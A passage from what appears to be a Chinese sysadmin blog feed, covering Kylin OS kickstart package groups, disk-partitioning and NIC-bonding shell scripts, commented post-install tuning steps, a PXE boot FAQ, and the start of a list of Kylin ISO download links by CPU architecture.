系统工具，这组软件包是各类系统工具的集合，如：连接SMB共享的客户；监控网络交通的工具。</span><span class="hljs-comment">## 虚拟化主机</span><span class="hljs-comment">#@^virtualization-host-environment</span><span class="hljs-comment">#@container-management # 容器管理，用于管理Linux容器的工具。</span><span class="hljs-comment">#@debugging # 调试工具，调试行为异常程序以及诊断性能问题的工具。</span><span class="hljs-comment">#@development # 开发工具，基本开发环境。</span><span class="hljs-comment">#@headless-management # 无图形终端系统管理工具，用于管理无图像终端系统的工具。</span><span class="hljs-comment">#@kysecurity-SDK # 安全套件SDK，安全套件SDK。</span><span class="hljs-comment">#@kysecurity-enhance # 麒麟安全增强工具，麒麟软件安全增强工具。</span><span class="hljs-comment">#@legacy-unix # 传统UNIX兼容性。</span><span class="hljs-comment">#@man-help # Man手册，Man手册帮助系统</span><span class="hljs-comment">#@network-file-system-client # 网络文件系统客户端，启用该系统附加到网络存储。</span><span class="hljs-comment">#@openvswitch # 虚拟switch，安装vswitch。</span><span class="hljs-comment">#@remote-system-management # Linux的远程管理，Linux的远程管理界面。</span><span class="hljs-comment">#@scientific # 科学计数法支持</span><span class="hljs-comment">#@security-tools # 安全性工具，用于完整性和可信验证的安全性工具。</span><span class="hljs-comment">#@smart-card # 智能卡支持，支持使用智能卡验证。</span><span class="hljs-comment">#@system-tools # 系统工具，这组软件包是各类系统工具的集合，如：连接SMB共享的客户；监控网络交通的工具。</span><span class="hljs-comment">## 带UKUI GUI的服务器</span>@^kylin-desktop-environment<span class="hljs-comment">#@container-management # 容器管理，用于管理Linux容器的工具。</span><span class="hljs-comment">#@debugging # 调试工具，调试行为异常程序以及诊断性能问题的工具。</span><span class="hljs-comment">#@development # 开发工具，基本开发环境。</span><span class="hljs-comment">#@dns-server # DNS名称服务器，该软件包组允许您在系统上运行DNS名称服务器（BIND）。</span><span class="hljs-comment">#@file-server # 文件及存储服务器，CIFS，SMB，NFS，iSCSI，iSER及iSNS网络存储服务器。</span><span class="hljs-comment">#@ftp-server # FTP服务器，这些工具允许您在系统上运行FTP服务器。</span><span class="hljs-comment">#@gnome-apps # GNOME应用程序，一组经常使用的GNOME应用程序。</span><span class="hljs-comment">#@headless-management # 无图形终端系统管理工具，用于管理无图像终端系统的工具。</span><span class="hljs-comment">#@infiniband # Infiniband支持，该软件旨在使用基于RDMA的InfiniBand，iWARP，RoCE和OPS架构来支持集群，网络连接和低延迟，高带宽存储。</span>@kysecurity-SDK <span class="hljs-comment"># 安全套件SDK，安全套件SDK。</span><span class="hljs-comment">#@kysecurity-enhance # 麒麟安全增强工具，麒麟软件安全增强工具。</span><span class="hljs-comment">#@legacy-unix # 传统UNIX兼容性。</span><span class="hljs-comment">#@legacy-x # 传统X Windows系统的兼容性，用于从继承X Windows环境中迁移或者可用于该环境的兼容程序。</span><span class="hljs-comment">#@mail-server # 邮件服务器，这些软件包运行您配置IMAP或Postfix邮件服务器</span>@man-help <span class="hljs-comment"># Man手册，Man手册帮助系统</span><span class="hljs-comment">#@performance # 性能工具，诊断系统和程序级别性能问题的工具。</span><span class="hljs-comment">#@remote-desktop-clients # 远程桌面客户端，远程桌面软件。</span><span class="hljs-comment">#@remote-desktop-servers # 远程桌面服务端，远端桌面服务端软件。</span><span class="hljs-comment">#@remote-system-management # Linux的远程管理，Linux的远程管理界面。</span><span class="hljs-comment">#@scientific # 科学计数法支持</span><span class="hljs-comment">#@security-tools # 安全性工具，用于完整性和可信验证的安全性工具。</span><span class="hljs-comment">#@smart-card # 智能卡支持，支持使用智能卡验证。</span><span class="hljs-comment">#@smb-server # 文件及存储服务器，CIFS，SMB，NFS，iSCSI，iSER及iSNS网络存储服务器。</span><span class="hljs-comment">#@system-tools # 系统工具，这组软件包是各类系统工具的集合，如：连接SMB共享的客户；监控网络交通的工具。</span><span class="hljs-comment">#@virtualization-hypervisor # 虚拟化 Hypervisor，最小的虚拟化主机安装。</span><span class="hljs-comment">#@virtualization-tools # 虚拟化工具，用于离线虚拟映像管理的工具。</span><span class="hljs-comment">#@web-server # 基本网页服务器，这些工具运行您在系统上运行万维网服务器。</span>%end</code></pre><h3 id="桌面-Ubuntu系"><a href="#桌面-Ubuntu系" class="headerlink" title="桌面 (Ubuntu系)"></a>桌面 (Ubuntu系)</h3><hr><h2 id="Centos"><a href="#Centos" class="headerlink" title="Centos"></a>Centos</h2><h2 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h2><h2 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h2><h3 id="标准分区"><a href="#标准分区" class="headerlink" title="标准分区"></a>标准分区</h3><blockquote><p>安装系统前检查和确定分区方案，并输出到&#x2F;tmp&#x2F;sda-nvme.txt中，等安装系统时执行</p></blockquote><blockquote><p>ks-sda-nvme-lvm.cfg</p></blockquote><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><span class="hljs-comment"># 检查系统中是否存在nvme0n1磁盘</span><span class="hljs-keyword">if</span> lsblk | grep -q <span class="hljs-string">&#x27;nvme0n1&#x27;</span>; <span class="hljs-keyword">then</span>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;检测到NVMe磁盘(nvme0n1)，采用方案A配置&quot;</span>        <span class="hljs-comment"># 生成Kickstart分区配置文件</span>    <span class="hljs-built_in">cat</span> &gt; /tmp/sda-nvme.txt &lt;&lt; <span class="hljs-string">&#x27;EOF&#x27;</span>ignoredisk --only-use=nvme0n1part pv.112 --fstype=<span class="hljs-string">&quot;lvmpv&quot;</span> --ondisk=nvme0n1 --growpart /boot --fstype=<span class="hljs-string">&quot;xfs&quot;</span> --ondisk=nvme0n1 --size=1024part /boot/efi --fstype=<span class="hljs-string">&quot;efi&quot;</span> --ondisk=nvme0n1 --size=512 --fsoptions=<span class="hljs-string">&quot;umask=0077,shortname=winnt&quot;</span>volgroup ks1 --pesize=4096 pv.112logvol / --fstype=<span class="hljs-string">&quot;xfs&quot;</span> --size=1 --grow --name=root --vgname=ks1logvol swap --fstype=<span class="hljs-string">&quot;swap&quot;</span> --size=2048 --name=swap --vgname=ks1EOF<span class="hljs-keyword">else</span>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;未检测到NVMe磁盘，采用方案B配置(SATA磁盘)&quot;</span>        <span class="hljs-comment"># 生成SATA磁盘的备用配置</span>    <span class="hljs-built_in">cat</span> &gt; /tmp/sda-nvme.txt &lt;&lt; <span class="hljs-string">&#x27;EOF&#x27;</span>ignoredisk --only-use=sdapart pv.112 --fstype=<span class="hljs-string">&quot;lvmpv&quot;</span> --ondisk=sda --growpart /boot --fstype=<span class="hljs-string">&quot;xfs&quot;</span> --ondisk=sda --size=1024part /boot/efi --fstype=<span class="hljs-string">&quot;efi&quot;</span> --ondisk=sda --size=512 --fsoptions=<span class="hljs-string">&quot;umask=0077,shortname=winnt&quot;</span>volgroup ks1 --pesize=4096 pv.112logvol / --fstype=<span class="hljs-string">&quot;xfs&quot;</span> --size=1 --grow --name=root --vgname=ks1logvol swap --fstype=<span class="hljs-string">&quot;swap&quot;</span> --size=2048 --name=swap --vgname=ks1EOF<span class="hljs-keyword">fi</span><span class="hljs-comment"># 添加可选分区示例 (按需取消注释)</span><span class="hljs-comment"># echo &#x27;logvol /data --fstype=&quot;xfs&quot; --size=3145728 --name=data --vgname=ks1&#x27; &gt;&gt; /tmp/sda-nvme.txt</span><span class="hljs-comment"># echo &#x27;logvol /home --fstype=&quot;xfs&quot; --size=51200 --name=home --vgname=ks1&#x27; &gt;&gt; /tmp/sda-nvme.txt</span></code></pre><blockquote></blockquote><h3 id="网卡bond-sh"><a href="#网卡bond-sh" class="headerlink" title="网卡bond.sh"></a>网卡bond.sh</h3><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;请输入bond接口名称&quot;</span><span class="hljs-built_in">read</span> bond_name<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;请输入bond ip（如192.168.1.1/24）&quot;</span><span class="hljs-built_in">read</span> bond_ip<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;请输入bond 网关（如192.168.1.254）&quot;</span><span class="hljs-built_in">read</span> bond_gateway<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;请输入物理网卡名称（如 eth0,eth1）&quot;</span><span class="hljs-built_in">read</span> physical_interfaces<span class="hljs-comment">#将物理网卡列表转为数组</span>IFS=<span class="hljs-string">&#x27;,&#x27;</span> <span class="hljs-built_in">read</span> -ra physical_interfaces_array &lt;&lt;&lt; <span class="hljs-string">&quot;<span class="hljs-variable">$physical_interfaces</span>&quot;</span><span class="hljs-function"><span class="hljs-title">bond_create</span></span>() &#123;    <span class="hljs-comment">#创建bond 接口</span>    nmcli connection add <span class="hljs-built_in">type</span> bond con-name <span class="hljs-variable">$bond_name</span> ifname <span class="hljs-variable">$bond_name</span> mode <span class="hljs-variable">$bond_mode</span>    <span class="hljs-keyword">if</span> [ $? -ne 0 ]; <span class="hljs-keyword">then</span>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;bond 接口 <span class="hljs-variable">$bond_name</span> 创建失败&quot;</span>        <span class="hljs-built_in">exit</span> 1    <span class="hljs-keyword">fi</span>    <span class="hljs-comment">#将物理网卡添加到bond接口</span>    <span class="hljs-keyword">for</span> interface <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;physical_interfaces_array[@]&#125;</span>&quot;</span>; <span class="hljs-keyword">do</span>        nmcli connection add <span class="hljs-built_in">type</span> ethernet slave-type bond con-name <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;interface&#125;</span>-slave&quot;</span> ifname <span class="hljs-variable">$interface</span> master <span class="hljs-variable">$bond_name</span>        <span class="hljs-keyword">if</span> [ $? -ne 0 ]; <span class="hljs-keyword">then</span>            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;将网卡<span class="hljs-variable">$interface</span> 添加到bond接口失败&quot;</span>            <span class="hljs-built_in">exit</span> 1        <span class="hljs-keyword">fi</span>    <span class="hljs-keyword">done</span>    <span class="hljs-comment">#配置bond接口的ip</span>    nmcli connection modify <span class="hljs-variable">$bond_name</span> ipv4.addresses <span class="hljs-variable">$bond_ip</span>  ipv4.gateway <span class="hljs-variable">$bond_gateway</span>  ipv4.method manual    <span class="hljs-keyword">if</span> [ $? -ne 0 ]; <span class="hljs-keyword">then</span>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;修改 <span class="hljs-variable">$bond_name</span> 网络参数失败&quot;</span>        <span class="hljs-built_in">exit</span> 1    <span class="hljs-keyword">fi</span>    <span class="hljs-comment">#激活bond 接口</span>    nmcli connection up <span class="hljs-variable">$bond_name</span>    <span class="hljs-keyword">if</span> [ $? -ne 0 ]; <span class="hljs-keyword">then</span>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$bond_name</span> 激活失败&quot;</span>        <span class="hljs-built_in">exit</span> 1    <span class="hljs-keyword">fi</span>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$bond_name</span> 成功配置及激活&quot;</span>&#125;<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;bond配置菜单如下：&quot;</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;1.配置bond0（balance-rr）轮询&quot;</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;2.配置bond1（active-backup）主备&quot;</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;3.配置bond4（802.3ad）动态聚合链路&quot;</span><span class="hljs-built_in">read</span> Bond<span class="hljs-keyword">case</span> <span class="hljs-variable">$Bond</span> <span class="hljs-keyword">in</span>    1)        bond_mode=<span class="hljs-string">&quot;balance-rr&quot;</span>        bond_create        ;;    2)        bond_mode=<span class="hljs-string">&quot;active-backup&quot;</span>        bond_create        ;;    3)        bond_mode=<span class="hljs-string">&quot;802.3ad&quot;</span>        bond_create        ;;    *)        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;请输入1-3数字&quot;</span>        ;;<span class="hljs-keyword">esac</span></code></pre><h3 id="安装后的优化"><a href="#安装后的优化" class="headerlink" title="安装后的优化"></a>安装后的优化</h3><blockquote><p>sub-ks-v10-sp3-20240626-x86_64-gui.ks</p></blockquote><pre><code class="hljs bash"><span class="hljs-comment"># wget -O /etc/yum.repos.d/Centos-Base.repo https://repo.huaweicloud.com/repository/conf/CentOS-7-reg.repo</span><span class="hljs-comment"># wget -O /etc/yum.repos.d/epel.repo http://mirrors.cloud.tencent.com/repo/epel-7.repo</span><span class="hljs-comment">#cat &gt; /etc/yum.repos.d/nginx.repo &lt;&lt; EOF</span><span class="hljs-comment">#[nginx-stable]</span><span class="hljs-comment">#name=nginx stable repo</span><span class="hljs-comment">#baseurl=http://nginx.org/packages/centos/\$releasever/\$basearch/</span><span class="hljs-comment">#gpgcheck=1</span><span class="hljs-comment">#enable=1</span><span class="hljs-comment">#gpgkey=https://nginx.org/keys/nginx_signing.key</span><span class="hljs-comment">#module_hotfixes=true</span><span class="hljs-comment">#EOF</span><span class="hljs-comment"># aolis7.9/openEuler 不能使用nginx源</span><span class="hljs-comment"># 禁止某些用户登录，等保要求</span><span class="hljs-comment">#sed -i &#x27;s/^Ip/#Ip/g&#x27; /etc/passwd</span><span class="hljs-comment">#sed -i &#x27;s/^sysnc/#sync/g&#x27; /etc/passwd</span><span class="hljs-comment">#sed -i &#x27;s/^shutdown/#shutdown/g&#x27; /etc/passwd</span><span class="hljs-comment">#sed -i &#x27;s/^halt/#halt/g&#x27; /etc/passwd</span><span class="hljs-comment">#sed -i &#x27;s/^operator/#operator/g&#x27; /etc/passwd</span><span class="hljs-comment">#sed -i &#x27;s/^games/#games/g&#x27; /etc/passwd</span><span class="hljs-comment">#sed -i &#x27;s/^ftp/#ftp/g&#x27; /etc/passwd</span><span class="hljs-comment"># 系统优化，增加用户最大线程数，最大打开文件数</span><span class="hljs-comment">#cat &gt; /etc/security/limits.d/mylimits.conf &lt;&lt; -EOF_LIMITS</span><span class="hljs-comment">#*      soft    nproc   131072</span><span class="hljs-comment">#*      hard    nproc   131072</span><span class="hljs-comment">#*      soft    nofile  65536</span><span class="hljs-comment">#*      hard    nofile  65536</span><span class="hljs-comment">#EOF_LIMITS</span><span class="hljs-comment"># 系统优化2，</span><span class="hljs-comment">#cat &gt; /etc/profile.d/prompt.sh &lt;&lt; EOF</span><span class="hljs-comment">#PS1=&quot;\[\e[1;33m\][\u@\h \W]\[\e[0m\]\\$ &quot;</span><span class="hljs-comment">#alias cgrep=&quot;egrep -v &#x27;^(#|$)&#x27;&quot;</span><span class="hljs-comment">#alias nt=&#x27;netstat -tnlp&#x27;</span><span class="hljs-comment">#alias ntu=&#x27;netstat -tnlpu&#x27;</span><span class="hljs-comment">#alias cdnet=&#x27;cd /etc/sysconfig/network-scripts/&#x27;</span><span class="hljs-comment">#ailas scandisk=&#x27;echo ---&gt; /sys/class/scsi_host/host0/scan;echo ---&gt; /sys/class/scsi_host/host1/scan;echo ---&gt; /sys/class/scsi_host/host2/scan&#x27;</span><span class="hljs-comment">#export HISTZIE=10000</span><span class="hljs-comment">#export HISTTIMEFORMAT=&quot;%F-%T `whoami` &quot;</span><span class="hljs-comment">#EOF</span><span class="hljs-comment"># source /ect/profile.d/prompat.sh</span><span class="hljs-comment"># 系统优化3，</span><span class="hljs-comment"># Centos7和Centos8有些不同</span><span class="hljs-comment">#sed -i.bak &#x27;/^#UseDNS/aUseDNS no&#x27; /etc/ssh/sshd_config</span><span class="hljs-comment"># sed -i &#x27;s/GSSAPIAuthentication yes/GSSAPIAuthentication no/&#x27; /etc/sshd/sshd_config</span><span class="hljs-comment">## 网卡Bound设置</span><span class="hljs-comment"># nmcli connection delete eth0</span><span class="hljs-comment"># nmcli connection delete eth1</span><span class="hljs-comment"># nmcli connection add type bond ifname bond0 con-name bond0 mode active-backup miimon 100</span><span class="hljs-comment"># nmcli connection add type bond-slave ifname eth0 con-name bond0-eth0 master bond0</span><span class="hljs-comment"># nmcli connection add type bond-slave ifname eth1 con-name bond0-eth1 master bond0</span><span class="hljs-comment"># nmcli connection modify bond0 ipv4.method manual ipv4.addresses 192.168.35.53/24 ipv4.gateway 192.168.35.2 autoconnect yes</span><span class="hljs-comment"># nmcli connection up bond0</span><span class="hljs-comment"># ifconfig</span><span class="hljs-comment"># mkdir /etc/network</span><span class="hljs-comment"># echo &quot;interface=bond0&quot; &gt;&gt; /etc/network/default_gw</span><span class="hljs-comment"># cat /etc/network/default_gw</span><span class="hljs-comment"># nmcli connection show</span></code></pre><h2 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h2><h3 id="NBP-is-too-big-to-fix-in-free-base-memory"><a href="#NBP-is-too-big-to-fix-in-free-base-memory" class="headerlink" title="NBP is too big to fix in free base memory"></a>NBP is too big to fix in free base memory</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250915135859291.png" alt="img"></p><pre><code class="hljs bash"><span class="hljs-comment"># 解决方法</span>关闭VMware的自动DHCP功能柜、测试机器选择UEFI启动。</code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250915141105791.png" alt="img"></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250915145425640.png" alt="img"></p><hr>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>KylinOS</title>
      <link href="/2025/02/12/KylinOS/"/>
      <url>/2025/02/12/KylinOS/</url>
      
        <content type="html"><![CDATA[<h1 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h1><blockquote><p>麒麟遨天</p></blockquote><h2 id="1-1-桌面镜像"><a href="#1-1-桌面镜像" class="headerlink" title="1.1 桌面镜像"></a>1.1 桌面镜像</h2><pre><code class="hljs bash">操作系统版本跟芯片对应以及下载地址intel12代一下---HWE，intel12代及以上---HWE-PP</code></pre><h3 id="1-1-1-86架构"><a href="#1-1-1-86架构" class="headerlink" title="1.1.1 86架构"></a>1.1.1 86架构</h3><blockquote><p>intel-amd</p></blockquote><p>INTEL-13代：<a href="https://iso.kylinos.cn/web_pungi/download/cdn/Xcm7e30IBGZ6VFdjbyDvxTsYPL9hgA2r/">Kylin-Desktop-V10-SP1-2303-update2-HWE-6.1-Release-20240122-x86_64.iso</a></p><p>INTEL-AMD-12代：<a href="https://iso.kylinos.cn/web_pungi/download/cdn/oLNq59PmxHAe08TrE6I2bhfl3jRJynBt/">Kylin-Desktop-V10-SP1-2503-HWE-PP-Release-20250430-X86_64.iso</a></p><p>INTEL-AMD-12代以下 <a href="https://iso.kylinos.cn/web_pungi/download/cdn/79jAZvyiVrMUbQ8KDWRNLp4Bt36swzfP/">Kylin-Desktop-V10-SP1-2503-HWE-Release-20250430-X86_64.iso</a></p><p>INTEL-AMD-12代以下 <a href="https://iso.kylinos.cn/web_pungi/download/cdn/RZMqj21p9ayArk4sLlKwYtbH5TdFNgQS/">Kylin-Desktop-V10-SP1-HWE-Release-2203-X86_64.iso</a></p><blockquote><p>兆芯、海光</p></blockquote><p><a href="https://iso.kylinos.cn/web_pungi/download/cdn/hqunz19sIF8opVBgZD3UPEWaQM2OYTy4/">Kylin-Desktop-V11-2503-Release-20250212-X86_64.iso</a></p><p><a href="https://iso.kylinos.cn/web_pungi/download/cdn/N1kIGe0WnfAMilFVURgrC75szThH6QKc/">Kylin-Desktop-V10-SP1-2503-Release-20250430-X86_64.iso</a></p><p><a href="https://iso.kylinos.cn/web_pungi/download/cdn/kr2GXJian8qzg4deDwPvtN91QoMZOHSV/">Kylin-Desktop-V10-SP1-2403-Release-20240430-x86_64.iso</a></p><p><a href="https://distro-images.kylinos.cn:8802/web_pungi/download/share/b4vmX7qEk90dyBrFfS5ANpGngaW2hZUK/">Kylin-Desktop-V10-SP1-General-Release-2303-X86_64.iso</a></p><blockquote><p>申威</p></blockquote><p><a href="https://iso.kylinos.cn/web_pungi/download/cdn/yqZFO7w5DBY9Ajh2CaSxUnsGHQTg0PVp/">Kylin-Desktop-V10-SP1-2503-Release-20250430-SW64.iso</a></p><p><a href="https://distro-images.kylinos.cn:8802/web_pungi/download/share/XiGHY0EBQSC8ehIqzfPwaxsRu72vo5VT/">Kylin-Desktop-V10-SP1-General-Release-2303-SW64.iso</a></p><h3 id="1-1-2-ARM"><a href="#1-1-2-ARM" class="headerlink" title="1.1.2 ARM"></a>1.1.2 ARM</h3><blockquote><p>飞腾、鲲鹏</p></blockquote><p><a href="https://iso.kylinos.cn/web_pungi/download/cdn/i8JVstPLwnSjzaFpgr6f74mdhBlq1N5Y/">Kylin-Desktop-V10-SP1-2503-Release-20250430-ARM64.iso</a></p><p><a href="https://iso.kylinos.cn/web_pungi/download/cdn/E8sPjCYb7GmL15eWtx206AD4igcF9fJz/">Kylin-Desktop-V10-SP1-2403-Release-20240430-arm64.iso</a></p><p><a href="https://iso.kylinos.cn/web_pungi/download/cdn/ni3tIfZoEKLDglszRXvh9WymuwOT5r6M/">Kylin-Server-V10-SP3-2403-Release-20240426-arm64.iso</a></p><p><a href="https://distro-images.kylinos.cn:8802/web_pungi/download/share/M8UbGlg2WyeHnANzv0srJOEjC9R7ZXDx/">Kylin-Desktop-V10-SP1-General-Release-2303-ARM64.iso</a></p><p><a href="https://iso.kylinos.cn/web_pungi/download/cdn/2r9DfSBgAkQu4atRG3zFdnIshlTbVCPo/">Kylin-Server-V11-2503-Release-General-20250715-ARM64.iso</a></p><blockquote><p>海思</p></blockquote><p>9006C <a href="https://distro-images.kylinos.cn:8802/web_pungi/download/share/VueaGiRJOlAqKgt2TN379Qrkw1fZ6CxY/">Kylin-Desktop-V10-SP1-2403-update1-Wayland-Release-Retail-HW-kirin9006c-20250711-ARM64.iso</a></p><p>9006C <a href="https://distro-images.kylinos.cn:8802/web_pungi/download/share/ijQZXxVLUYHvSwtoB41rFPbf63uMDNTA/">Kylin-Desktop-V10-SP1-2403-update1-Wayland-Release-Retail-HW-kirin9006c-20241225-ARM64.iso</a></p><p>9006C <a href="https://distro-images.kylinos.cn:8802/web_pungi/download/share/zHgYotRBcA4w1TeDhxapi7MFsJUZ6V83/">Kylin-Desktop-V10-SP1-kirin9006c-Release-2203-ARM64</a></p><p>9000C <a href="https://distro-images.kylinos.cn:8802/web_pungi/download/share/UtG9kfabj4Ty716pzhHsonvNWm3KqCSE/">Kylin-Desktop-V10-SP1-2403-Wayland-Release-Retail-HW-pangux-20241021-ARM64.iso</a></p><p>990 <a href="https://distro-images.kylinos.cn:8802/web_pungi/download/share/l3nmtkhqMzNX2w8ECeaVpfFDPBysr4YL/Kylin-Desktop-V10-SP1-2403-update2-Wayland-Release-Retail-HW-M900-W525-20250606-ARM64.iso">Kylin-Desktop-V10-SP1-2403-update2-Wayland-Release-Retail-HW-M900-W525-20250606-ARM64.iso</a></p><p>990 <a href="https://distro-images.kylinos.cn:8802/web_pungi/download/share/KvPfn0UQARHBtXx4WCmThFDoGgJ9yrpa/">Kylin-Desktop-V10-SP1-2403-update1-Wayland-Release-Retail-HW-kirin990-20250107-ARM64.iso</a></p><p>990 <a href="https://iso.kylinos.cn/web_pungi/download/cdn/txUIpsJaSXWcHPif80B9Kvznr32LyQmC/">Kylin-Desktop-V10-SP1-2403-update1-Wayland-EDU-Release-kirin990-20240918-ARM64.iso</a></p><p>990 <a href="https://distro-images.kylinos.cn:8802/web_pungi/download/share/0b6DrFumSK3qI4xtO2oTpkRNcV8YPlJd/">Kylin-Desktop-V10-SP1-2303-update2-Wayland-Release-kirin990-20231106-arm64.iso</a></p><p>990 <a href="https://distro-images.kylinos.cn:8802/web_pungi/download/share/zLIk2b9SHcyGKFXRT8AagJMe34Dl5fvp/">Kylin-Desktop-V10-SP1-2303-update1-Wayland-Release-General-kirin990-20230703-ARM64.iso</a></p><p>990 <a href="https://distro-images.kylinos.cn:8802/web_pungi/download/share/Qc7enGgvzbLd5TURIOZFAw4VMfPmqary/">Kylin-Desktop-V10-SP1-kirin990-Release-2203-ARM64.iso</a></p><p>M900 <a href="https://iso.kylinos.cn/web_pungi/download/cdn/UCw4W2SVNF9R1zgYTHcBd8ApvK6Oye7n/">Kylin-Desktop-V10-SP1-2503-Wayland-Release-M900-20250508-ARM64.iso</a></p><p>M900 <a href="https://distro-images.kylinos.cn:8802/web_pungi/download/share/UtG9kfabj4Ty716pzhHsonvNWm3KqCSE/Kylin-Desktop-V10-SP1-2403-Wayland-Release-Retail-HW-pangux-20241021-ARM64.iso">Kylin-Desktop-V10-SP1-2403-Wayland-Release-Retail-HW-pangux-20241021-ARM64.iso</a></p><p>公版M900-w535不支持 2303-update3 <a href="https://distro-images.kylinos.cn:8802/web_pungi/download/share/OjYkhdC2uAURstDzgHiLPaVy1qmX85J9/">Kylin-Desktop-V10-SP1-2203-Wayland-Release-GXSG-panguw-20240229-arm64.iso</a></p><p>M900 <a href="https://distro-images.kylinos.cn:8802/web_pungi/download/share/lb6a79Y5r8fMkeq4XzytViK3QuwPcL0d/">Kylin-Desktop-V10-SP1-2303-update3-Wayland-Release-M900-20240130-arm64.iso</a></p><p>M900 <a href="https://distro-images.kylinos.cn:8802/web_pungi/download/share/J3HbSR5QKB8n2TCoNzXmeZp7rGqlIdyA/">Kylin-Desktop-V10-SP1-M900-Release-20220728-W525-ARM64.iso</a></p><h3 id="1-1-3-龙芯"><a href="#1-1-3-龙芯" class="headerlink" title="1.1.3 龙芯"></a>1.1.3 龙芯</h3><blockquote><p>LoongArch</p></blockquote><p>3A5000及以上 <a href="https://iso.kylinos.cn/web_pungi/download/cdn/j1m5tfWsvMY7Gdez0bhrFxcaZRpyDUPi/">Kylin-Desktop-V10-SP1-2503-Release-20250430-LoongArch64.iso</a></p><p>3A5000 <a href="https://iso.kylinos.cn/web_pungi/download/cdn/5aVgLwmAlH4Y6CD3uIXP01noizhS8xGE/">Kylin-Desktop-V10-SP1-2403-Release-20240506-loongarch64.iso</a></p><p>3A5000 <a href="https://distro-images.kylinos.cn:8802/web_pungi/download/share/s5ELkGOWFN6nfimZetdBgKvzDVuhjP8R/">Kylin-Desktop-V10-SP1-2303-update1-Release-General-20230703-LoongArch64.iso</a></p><p>3A5000 <a href="https://distro-images.kylinos.cn:8802/web_pungi/download/share/k1TnrIxSJ5dt47bzAeiOF0upRslgV9hE/">Kylin-Desktop-V10-SP1-General-Release-2303-LoongArch64.iso</a></p><p><a href="https://iso.kylinos.cn/web_pungi/download/cdn/HsNdCbacX6gEiS2UvTFf8uqQAkI0Ohyz/">Kylin-Server-V11-2503-Release-General-20250715-LoongArch64.iso</a></p><p><a href="https://iso.kylinos.cn/web_pungi/download/cdn/tLh71VaxXSoTDP8yBz4YnrMZlmk3QvGJ/">Kylin-Server-V10-SP3-2403-Release-20240426-loongarch64.iso</a></p><blockquote><p>mips64el</p></blockquote><p>3A4000 <a href="https://iso.kylinos.cn/web_pungi/download/cdn/65Qu1DWGeKilEqSgYjL8Vyrvf2RsaxOB/">Kylin-Desktop-V10-SP1-2403-Release-20240430-mips64el.iso</a></p><p>3A3000 <a href="https://distro-images.kylinos.cn:8802/web_pungi/download/share/jWbeB9k6FLvySThKilrgX5QUd0cwYtHo/">Kylin-Desktop-V10-SP1-General-Release-2303-MIPS64el.iso</a></p><p><a href="https://distro-images.kylinos.cn:8802/web_pungi/download/share/dEbpCiHZgYvxNwAmW2XlTVOPRS6h30nq/">Kylin-Server-10-SP1-Release-Build18-20210809-mips64el.iso</a></p><h3 id="1-1-4-OEM"><a href="#1-1-4-OEM" class="headerlink" title="1.1.4 OEM"></a>1.1.4 OEM</h3><p><a href="https://distro-images.kylinos.cn:8802/web_pungi/download/share/dqB7uHZ45Q8Krk0ylxCsOapmYNXGz3bv/">Kylin-Desktop-V10-SP1-2403-Wayland-Release-Retail-pangux-b-20250808-ARM64.iso</a></p><p><a href="https://distro-images.kylinos.cn:8802/web_pungi/download/share/uAMCUhkFO49pIH0qjyYSnJNcgv1QZKEe/">Kylin-Desktop-V10-SP1-2403-update1-Release-Retail-LX-20241119-ARM64.iso</a></p><p><a href="https://distro-images.kylinos.cn:8802/web_pungi/download/share/LweHGc1X8NrhVYSpFOja2KokCBtxUqZQ/">Kylin-Desktop-V10-SP1-2403-Release-Retail-UNIS-D3830-G3-20240622-X86_64.iso</a></p><p><a href="https://distro-images.kylinos.cn:8802/web_pungi/download/share/KVXlNiqHGTCIJexWzcZA3vw64FPu5yB2/">Kylin-Desktop-V10-Release-OEM-YZZJ-21080814-arm64.iso</a></p><p><a href="https://iso.kylinos.cn/web_pungi/download/cdn/RoJpy4s3BtWhdg7IeYSQ0D5ULM6nEzbV/">Kylin-Desktop-V10-SP1-2403-Release-systemtools-20240626-X86_64.iso</a></p><p><a href="https://iso.kylinos.cn/web_pungi/download/cdn/DESK9uj41lZsbFhRUaTV5kNpmJYcMtn0/">Kylin-Server-V10-SP3-2403-Release-Qcow2-20240426-arm64.qcow2.xz</a></p><p><a href="https://distro-images.kylinos.cn:8802/web_pungi/download/share/Q0j7FDEv4wfO1RB6lpNLt3kmsra8bo2u/">Kylin-Kylin-Desktop-V10-SP1-2107-Release-jjw-ARM64.iso</a></p><h2 id="1-2-服务器镜像"><a href="#1-2-服务器镜像" class="headerlink" title="1.2 服务器镜像"></a>1.2 服务器镜像</h2><h3 id="1-2-1-86架构"><a href="#1-2-1-86架构" class="headerlink" title="1.2.1 86架构"></a>1.2.1 86架构</h3><blockquote><p>兆芯、海光</p></blockquote><p><a 